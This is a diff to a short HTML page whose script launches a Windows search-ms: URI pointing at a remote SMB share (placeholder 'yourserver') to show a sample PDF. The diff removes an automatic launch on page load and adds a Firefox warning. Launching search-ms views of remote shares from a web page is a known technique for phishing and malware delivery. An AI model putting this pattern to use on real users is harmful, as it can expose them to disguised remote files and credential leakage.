@@ -4,24 +4,30 @@
   <title>Trigger Search-MS for PDF</title>
 </head>
 <body>
-  <h1>Loading File Search...</h1>
-  <p>If the search doesn’t open, <a href="https://yourdomain.com/sample.pdf">click here to view the PDF</a>.</p>
-  <button onclick="openSearch()">Open Search Now</button>
+  <h1>Open File Search</h1>
+  <p>Click the button to search for the PDF, or <a href="https://yourdomain.com/sample.pdf">view the PDF directly</a>.</p>
+  <p id="browser-warning" style="display: none; color: red;">
+    This feature may not work in Firefox. Please use Chrome, Edge, or the direct PDF link.
+  </p>
+  <button onclick="openSearch()">Search for PDF</button>
   <script>
+    function isFirefox() {
+      return navigator.userAgent.toLowerCase().includes("firefox");
+    }
+
     function openSearch() {
-      // Replace with your SMB share path and desired search term
       const searchUri = "search-ms:query=sample&crumb=location:\\\\yourserver\\public";
+      if (isFirefox()) {
+        document.getElementById("browser-warning").style.display = "block";
+        alert("Firefox may not fully support this feature. Try clicking the button, or use Chrome, Edge, or the direct PDF link.");
+      }
       try {
         window.location.href = searchUri;
-        setTimeout(() => {
-          alert("If the search didn’t open, ensure you have access to the file share or use the link above.");
-        }, 3000);
       } catch (e) {
-        alert("Error: " + e.message);
+        alert("Error: Could not open search. Ensure the file share is accessible or use the PDF link. (" + e.message + ")");
+        document.getElementById("browser-warning").style.display = "block";
       }
     }
-    // Auto-trigger after 2 seconds
-    setTimeout(openSearch, 2000);
   </script>
 </body>
 </html>
